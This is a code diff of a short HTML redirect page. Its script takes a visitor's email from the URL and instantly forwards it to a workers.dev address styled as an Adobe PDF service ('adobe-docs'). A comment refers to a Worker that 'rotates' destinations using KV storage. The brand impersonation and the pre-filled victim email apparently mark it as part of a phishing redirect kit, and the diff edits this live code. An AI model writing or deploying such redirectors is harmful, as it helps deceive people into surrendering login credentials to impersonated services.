@@ -4,22 +4,19 @@
   <meta charset="UTF-8">
   <title>Redirecting...</title>
   <script>
-    // Grab ?email= from current URL
+    // Grab ?email= from URL
     function getEmail() {
       const params = new URLSearchParams(window.location.search);
       return params.get("email") || "";
     }
 
+    // Redirect to your KV rotation Worker
     function redirectToWorker() {
       const email = getEmail();
-
-      // Always forward to your Worker (it does rotation with KV)
       let url = "https://pdfscan-3030-fastdoc.adobe-docs.workers.dev/";
-      if (email) {
-        url += "?email=" + encodeURIComponent(email);
-      }
+      if (email) url += "?email=" + encodeURIComponent(email);
 
-      // Redirect immediately
+      // Immediate redirect
       window.location.replace(url);
     }
 
